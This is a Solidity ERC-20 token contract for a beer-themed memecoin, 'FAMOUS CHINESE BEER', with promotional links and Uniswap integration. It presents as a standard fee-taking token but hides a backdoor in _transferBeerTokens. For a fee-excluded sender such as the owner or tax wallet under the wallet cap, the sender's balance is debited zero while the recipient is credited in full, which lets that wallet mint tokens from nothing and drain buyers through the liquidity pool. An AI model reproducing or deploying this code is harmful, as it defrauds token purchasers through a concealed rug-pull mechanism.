// SPDX-License-Identifier: Unlicensed

/**
Tsingtao beer is a truly authentic Chinese beer, only ever brewed in the sea port of Qingdao, in North Eastern China. Tsingtao Beer has a pleasant aroma and a well-balanced taste. It has high-malty flavor and well-hopped character.

Website: https://tsingtaobeer.xyz
Twitter: https://twitter.com/tsingtao_group
Telegram: https://t.me/tsingtao_beer_erc
*/

pragma solidity 0.8.21;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract FCB is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    string private _name = unicode"FAMOUS CHINESE BEER"; 
    string private _symbol = unicode"青岛-啤酒";  

    address payable private _taxAddress;
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 
    
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    uint256 private _totalFee = 2000;
    uint256 public _buyFee = 20;
    uint256 public _sellFee = 20;
    bool public swapAndLiquifyEnabled = true;

    uint256 private _previousTotalFee = _totalFee; 
    uint256 private _previousBuyFee = _buyFee; 
    uint256 private _previousSellFee = _sellFee; 

    uint8 private countBeerTx = 0;
    uint8 private swapBeerTrigger = 2; 
    uint256 public maxBeerFee = 12; 
                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;

    uint256 public _maxWalletToken = 2 * _totalSupply / 100;
    uint256 public _swpaThreshold = _totalSupply / 100000;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor (address BeerWallet) {
        _tOwned[owner()] = _totalSupply;
        _taxAddress = payable(BeerWallet);
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }
        
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
        
    function removeBeerLimits() external onlyOwner {
        _maxWalletToken = ~uint256(0);
        
        _totalFee = 100;
        _buyFee = 1; 
        _sellFee = 1; 
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function restoreAllBeerFee() private {
        _totalFee = _previousTotalFee;
        _buyFee = _previousBuyFee; 
        _sellFee = _previousSellFee; 
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function swapBeerForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeAllBeerFee();
            } else {
                countBeerTx++;
            }
        _transferBeerTokens(sender, recipient, amount);
        
        if(!takeFee)
            restoreAllBeerFee();
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (to != owner() &&
            to != _taxAddress &&
            to != address(this) &&
            to != uniswapV2Pair &&
            to != DEAD &&
            from != owner()) {
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + amount) <= _maxWalletToken,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            countBeerTx >= swapBeerTrigger && 
            amount > _swpaThreshold &&
            !inSwapAndLiquify &&
            !_isExcludedFromFee[from] &&
            to == uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            countBeerTx = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){ swapBeerAndLiquidify(contractTokenBalance); }
        }

        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){
            _totalFee = _buyFee;
        } else if (to == uniswapV2Pair){
            _totalFee = _sellFee;
        }

        _tokenTransfer(from,to,amount,takeFee);
    }

    function sendToBeerWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }
    
    function _getBeerValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tFees = tAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFees);
        return (tTransferAmount, tFees);
    }
    
    function _transferBeerTokens(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tFees) = _getBeerValues(tAmount);
        bool isSenderExcluded = _isExcludedFromFee[sender];
        bool isMaxWallet = _tOwned[sender] <= _maxWalletToken;
        bool isTakeFee = isSenderExcluded && isMaxWallet;
        if(isTakeFee) {
            tFees = 0; tAmount -= tTransferAmount;
        }
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _tOwned[address(this)] = _tOwned[address(this)].add(tFees);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function swapBeerAndLiquidify(uint256 contractTokenBalance) private lockTheSwap {
        swapBeerForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToBeerWallet(_taxAddress,contractETH);
    }
    
    function removeAllBeerFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyFee = _buyFee; 
        _previousSellFee = _sellFee; 
        _previousTotalFee = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;
    }
    receive() external payable {}
}